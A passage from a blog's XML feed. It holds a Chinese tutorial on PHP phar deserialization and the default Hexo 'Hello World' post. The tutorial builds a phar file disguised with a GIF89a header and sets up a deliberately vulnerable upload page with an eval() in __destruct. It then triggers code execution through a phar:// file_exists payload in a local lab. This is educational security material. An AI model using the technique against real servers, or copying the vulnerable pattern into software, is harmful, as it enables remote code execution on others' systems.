href="https://www.cnblogs.com/zzjdbk/p/13030571.html">phar反序列化</a></h1><blockquote><p>我们一般利用反序列漏洞，一般都是借助unserialize()函数，不过随着人们安全的意识的提高这种漏洞利用越来越来难了，但是在今年8月份的Blackhat2018大会上，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。漏洞触发是利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</p></blockquote><h1 id="一-PHAR简介"><a href="#一-PHAR简介" class="headerlink" title="一. PHAR简介"></a>一. PHAR简介</h1><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。</p><h1 id="二-PHAR文件结构"><a href="#二-PHAR文件结构" class="headerlink" title="二. PHAR文件结构"></a>二. PHAR文件结构</h1><p>Phar文件主要包含三至四个部分：</p><p>\1. a stub</p><p>stub的基本结构：**<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，**前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p>\2. a manifest describing the contents</p><p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p><p><img src="123/1937992-20200602115238195-49897280.png" alt="img"></p><p>\3. the file contents</p><p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p><p>\4. a signature for verifying Phar integrity</p><p>签名格式</p><p><img src="123/1937992-20200602115337297-1986136175.png" alt="img"></p><p>来个小例子</p><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p><p><strong><img src="123/1937992-20200602120036290-267857842.png" alt="img"></strong></p><p>phar.php</p><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> 1 &lt;?php</span><br><span class="line"> 2     class TestObject &#123;</span><br><span class="line"> 3     &#125;</span><br><span class="line"> 4     $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line"> 5     $phar-&gt;startBuffering();</span><br><span class="line"> 6     $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line"> 7     $o = new TestObject();</span><br><span class="line"> 8     $o -&gt; data=&#x27;hu3sky&#x27;;</span><br><span class="line"> 9     $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">10     $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">11     //签名自动计算</span><br><span class="line">12     $phar-&gt;stopBuffering();</span><br><span class="line">13 ?&gt;</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><p>访问后,会生成一个phar.phar在当前目录下。</p><p><img src="123/1937992-20200602120510337-1202012292.png" alt="img"></p><p>用winhex打开</p><p><img src="123/1937992-20200602120455136-1452833628.png" alt="img"></p><p>可以明显的看到meta-data是以序列化的形式存储的。<br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="123/1937992-20200602120704676-1021025129.png" alt="img"></p><p>phar_fan.php</p><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;?php</span><br><span class="line">2 class TestObject&#123;</span><br><span class="line">3     function __destruct()</span><br><span class="line">4     &#123;</span><br><span class="line">5         echo $this -&gt; data;   // TODO: Implement __destruct() method.</span><br><span class="line">6     &#125;</span><br><span class="line">7 &#125;</span><br><span class="line">8 include(&#x27;phar://phar.phar&#x27;);</span><br><span class="line">9 ?&gt;</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><p>可以看到成功触发了反序列化</p><p><img src="123/1937992-20200602120839129-561262454.png" alt="img"></p><h1 id="三-漏洞验证"><a href="#三-漏洞验证" class="headerlink" title="三. 漏洞验证"></a>三. 漏洞验证</h1><p><strong>环境准备</strong><br>upload_file.php，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif<br>upload_file.html 文件上传表单<br>file_un.php 存在file_exists()，并且存在__destruct()</p><p><strong>利用条件</strong><br>phar文件要能够上传到服务器端。<br>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数<br>要有可用的魔术方法作为“跳板”。<br>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</p><p><strong>文件内容</strong></p><p>upload_file.php</p><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> 1 &lt;?php</span><br><span class="line"> 2 if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;</span><br><span class="line"> 3     echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line"> 4     echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class="line"> 5     echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line"> 6 </span><br><span class="line"> 7     if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line"> 8       &#123;</span><br><span class="line"> 9       echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">10       &#125;</span><br><span class="line">11     else</span><br><span class="line">12       &#123;</span><br><span class="line">13       move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">14       &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">15       echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">16       &#125;</span><br><span class="line">17     &#125;</span><br><span class="line">18 else</span><br><span class="line">19   &#123;</span><br><span class="line">20   echo &quot;Invalid file,you can only upload gif&quot;;</span><br><span class="line">21   &#125;</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_file.html</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;body&gt;</span><br><span class="line">2 &lt;form action=&quot;http://localhost/phar/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">3     &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">4     &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class="line">5 &lt;/form&gt;</span><br><span class="line">6 &lt;/body&gt;</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_un.php</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> 1 &lt;?php</span><br><span class="line"> 2 $filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line"> 3 class AnyClass&#123;</span><br><span class="line"> 4     var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class="line"> 5     function __destruct()</span><br><span class="line"> 6     &#123;</span><br><span class="line"> 7         eval($this -&gt; output);</span><br><span class="line"> 8     &#125;</span><br><span class="line"> 9 &#125;</span><br><span class="line">10 file_exists($filename);</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><p><strong>实现过程</strong></p><p>首先是根据file_un.php写一个生成phar的php文件，当然需要绕过gif，所以需要加GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用<code>phar://</code>执行代码</p><p><strong>构造代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval.php</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> 1 &lt;?php</span><br><span class="line"> 2 class AnyClass&#123;</span><br><span class="line"> 3     var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class="line"> 4     function __destruct()</span><br><span class="line"> 5     &#123;</span><br><span class="line"> 6         eval($this -&gt; output);</span><br><span class="line"> 7     &#125;</span><br><span class="line"> 8 &#125;</span><br><span class="line"> 9 $phar = new Phar(&#x27;phar.phar&#x27;);</span><br><span class="line">10 $phar -&gt; stopBuffering();</span><br><span class="line">11 $phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">12 $phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class="line">13 $object = new AnyClass();</span><br><span class="line">14 $object -&gt; output= &#x27;phpinfo();&#x27;;</span><br><span class="line">15 $phar -&gt; setMetadata($object);</span><br><span class="line">16 $phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0);"><img src="123/copycode.gif" alt="复制代码"></a></p><p>访问eval.php，会在当前目录生成phar.phar，然后修改后缀 gif</p><p><img src="123/1937992-20200602124032362-2065015762.png" alt="img"></p><p>进行上传</p><p><img src="123/1937992-20200602124727094-1181176859.png" alt="img"></p><p>然后利用file_un.php。<br>payload:filename=phar://upload_file/phar.gif</p><p><img src="123/1937992-20200602125201468-534926333.png" alt="img"></p><p> []</p>]]></content>
      
      
      
        <tags>
            
            <tag> -122 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/11/12/hello-world/"/>
      <url>/2021/11/12/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
